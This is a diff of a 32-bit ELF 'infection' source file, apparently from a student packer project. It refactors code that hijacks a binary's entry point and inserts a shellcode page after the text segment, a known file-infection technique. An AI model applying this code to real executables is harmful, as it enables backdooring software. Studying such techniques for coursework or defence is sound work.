@@ -3,10 +3,10 @@
 /*                                                        :::      ::::::::   */
 /*   infection_x32.c                                    :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: ddinaut <ddinaut.student.42.fr>            +#+  +:+       +#+        */
+/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/01/04 11:56:51 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/01/11 23:29:15 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/01/15 18:47:22 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -25,9 +25,9 @@ static int		modify_segment(t_packer *pack, Elf32_Ehdr *e_hdr, t_bdata *bdata)
 			p_hdr->p_offset += PAGESIZE;
 		else if (p_hdr->p_type == PT_LOAD && (p_hdr->p_flags == (PF_X | PF_R)))
 		{
-			bdata->p_vaddr = p_hdr->p_vaddr + p_hdr->p_filesz;
+			bdata->p_vaddr2 = p_hdr->p_vaddr + p_hdr->p_filesz;
 			bdata->old_entry = e_hdr->e_entry;
-			e_hdr->e_entry = bdata->p_vaddr;
+			e_hdr->e_entry = bdata->p_vaddr2;
 			bdata->end_of_text = p_hdr->p_offset + p_hdr->p_filesz;
 			p_hdr->p_filesz += SHELLSIZE_32;
 			p_hdr->p_memsz += SHELLSIZE_32;
@@ -49,7 +49,7 @@ static int		modify_section(t_packer *pack, Elf32_Ehdr *e_hdr, t_bdata *bdata)
 	{
 		if (s_hdr->sh_offset >= bdata->end_of_text)
 			s_hdr->sh_offset += PAGESIZE;
-		else if ((s_hdr->sh_size + s_hdr->sh_addr) == bdata->p_vaddr)
+		else if ((s_hdr->sh_size + s_hdr->sh_addr) == bdata->p_vaddr2)
 			s_hdr->sh_size += SHELLSIZE_32;
 		s_hdr = next_section_x32(pack, e_hdr, i);
 		if (s_hdr == NULL)
@@ -82,7 +82,7 @@ static void	insert_data(t_packer *pack, t_packer infected, t_bdata bdata)
 
 	get_shellcode_x32(fake_page, bdata);
 	write(infected.fd, pack->mapped, bdata.end_of_text);
-	write(infected.fd, fake_page, 4096);
+	write(infected.fd, fake_page, PAGESIZE);
 	write(infected.fd, &pack->mapped[bdata.end_of_text], pack->st.st_size - bdata.end_of_text);
 }
 
